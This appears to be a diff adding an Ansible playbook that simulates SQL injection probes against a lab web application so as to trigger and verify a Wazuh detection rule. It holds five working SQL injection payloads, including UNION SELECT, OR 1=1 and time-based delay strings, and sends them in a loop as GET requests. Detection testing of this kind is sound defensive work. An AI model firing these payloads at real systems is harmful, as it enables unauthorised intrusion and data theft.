@@ -1,0 +1,41 @@
+---
+# STAR-004 Attack Simulation — SQL Injection
+# Triggers Wazuh rule 100410
+
+- name: "STAR-004 — Simulate SQL injection probes"
+  hosts: attackers
+  gather_facts: false
+  vars_files:
+    - ../vars/star_config.yml
+
+  vars:
+    sqli_payloads:
+      - "apple%27%20UNION%20SELECT%20*%20FROM%20Users--"
+      - "test%27%20OR%201=1--"
+      - "test%27--"
+      - "apple%27%20AND%20SLEEP(2)--"
+      - "test%27%20WAITFOR%20DELAY%20%270:0:5%27--"
+
+  tasks:
+    - name: "Banner"
+      ansible.builtin.debug:
+        msg: "STAR-004 — SQL injection with {{ sqli_payloads | length }} payloads"
+
+    - name: "Send SQL injection probes"
+      ansible.builtin.uri:
+        url: "http://{{ web_target_host }}:{{ web_target_port }}/rest/products/search?q={{ item }}"
+        method: GET
+        status_code: [200, 400, 401, 500]
+        return_content: false
+      loop: "{{ sqli_payloads }}"
+      changed_when: false
+      failed_when: false
+
+    - name: "Pause for Wazuh detections"
+      ansible.builtin.pause:
+        seconds: 10
+
+    - name: "STAR-004 complete"
+      ansible.builtin.debug:
+        msg: "STAR-004 done. Verify rule.id:100410 in Wazuh (expect 5+ events)."
+
